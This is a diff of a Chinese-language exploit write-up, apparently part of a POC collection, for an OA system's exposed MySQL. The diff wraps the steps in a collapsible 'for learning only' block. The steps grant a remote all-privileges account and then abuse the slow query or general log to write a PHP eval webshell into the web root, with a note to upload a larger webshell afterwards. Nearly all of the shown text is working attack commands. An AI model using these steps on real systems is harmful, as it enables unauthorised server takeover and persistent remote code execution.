@@ -89,8 +89,10 @@ UPDATE `mysql`.`user` SET `Password` = '*FBCFBB73CF21D4F464A95E775B40AF27A679CD2
 
 ```sql
 grant all privileges ON mysql.* TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 利用漏洞写shell
 
 ```sql
@@ -99,13 +101,14 @@ select @@basedir; # F:\OA\mysql5\，那么web目录就是 F:/OA/webroot/
 # 方法1：
 set global slow_query_log=on;
 set global slow_query_log_file='F:/OA/webroot/';
-select '<?php eval($_POST[x]);?>' or sleep(11);
+select '&lt;?php &#101;val(&#36;_POST[x]);?&gt;' or sleep(11);
 # 方法2：
 set global general_log = on;
 set global general_log_file = 'F:/OA/webroot/';
-select '<?php eval($_POST[x]);?>';
-show variables like '%general%';
-```
+select '&lt;?php &#101;val(&#36;_POST[x]);?&gt;';
+show variables like '%general%';</code></pre>
+
+</details>
 
 上传大马
 
